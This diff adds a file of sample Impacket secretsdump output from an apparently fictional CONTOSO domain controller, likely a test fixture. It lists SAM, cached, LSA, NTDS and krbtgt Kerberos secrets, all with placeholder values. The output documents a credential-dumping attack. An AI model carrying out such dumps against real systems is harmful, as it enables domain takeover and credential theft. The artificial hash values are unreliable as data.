@@ -1,0 +1,29 @@
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x1234abcd5678ef01abcd5678ef901234
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+CONTOSO.LOCAL/admin:$DCC2$10240#admin#a1b2c3d4e5f60718293a4b5c6d7e8f90
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+CONTOSO\DC01$:plain_password_hex:abcdef0123456789fedcba9876543210abcdef0123456789fedcba9876543210
+CONTOSO\DC01$:aad3b435b51404eeaad3b435b51404ee:b1ef9b321b8e5e6e3a16a9e8b1ef9b32:::
+[*] DefaultPassword
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+CONTOSO\administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+CONTOSO\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abcdef0123456789fedcba9876543210:::
+CONTOSO\svc-sql:1107:aad3b435b51404eeaad3b435b51404ee:1234567890abcdef1234567890abcdef:::
+CONTOSO\svc-backup:1108:aad3b435b51404eeaad3b435b51404ee:fedcba9876543210fedcba9876543210:::
+CONTOSO\jdoe:1109:aad3b435b51404eeaad3b435b51404ee:0011223344556677889900aabbccddee:::
+[*] Kerberos keys grabbed
+CONTOSO\krbtgt:aes256-cts-hmac-sha1-96:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
+CONTOSO\krbtgt:aes128-cts-hmac-sha1-96:abcdef0123456789abcdef01234567890
+CONTOSO\krbtgt:rc4-hmac:abcdef0123456789fedcba9876543210
+[*] Cleaning up...
